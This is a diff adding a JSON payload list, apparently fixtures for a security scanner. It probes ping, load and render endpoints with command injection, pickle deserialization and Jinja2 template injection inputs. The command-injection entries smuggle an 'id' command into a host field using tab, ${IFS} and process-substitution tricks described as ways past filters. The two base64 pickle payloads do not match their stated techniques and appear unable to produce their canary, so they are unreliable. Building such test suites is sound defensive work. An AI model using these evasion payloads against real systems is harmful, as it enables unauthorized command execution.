@@ -1,0 +1,72 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%09id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Tab character (0x09) bypass for command separator"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1${IFS}id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "$IFS variable expansion to bypass space/pipe blocks"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1<(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Process substitution syntax to evade regex"
+  },
+  {
+    "id": "dyn_deser_1",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "gASVCwAAAAAAAABdlIwCaWRlLg=="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "Minimal pickle opcode (MARK, UNICODE, REDUCE) to bypass pattern matching"
+  },
+  {
+    "id": "dyn_deser_2",
+    "endpoint": "/load",
+    "method": "POST",
+    "params": {
+      "data": "KFZwMApwMQpTJ2lkJwpwMgpScDMuCg=="
+    },
+    "detect_pattern": "CANARY_DESER_9a1f7b",
+    "technique": "Alternative pickle protocol with string encoding to evade detection"
+  },
+  {
+    "id": "dyn_ssti_1",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{{ssti_canary|string}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Jinja2 filter chain to access variable without underscore"
+  },
+  {
+    "id": "dyn_ssti_2",
+    "endpoint": "/render",
+    "method": "POST",
+    "params": {
+      "template": "{% set x=ssti_canary %}{{x}}"
+    },
+    "detect_pattern": "CANARY_SSTI_2b6d4e",
+    "technique": "Variable assignment to bypass direct access restrictions"
+  }
+]
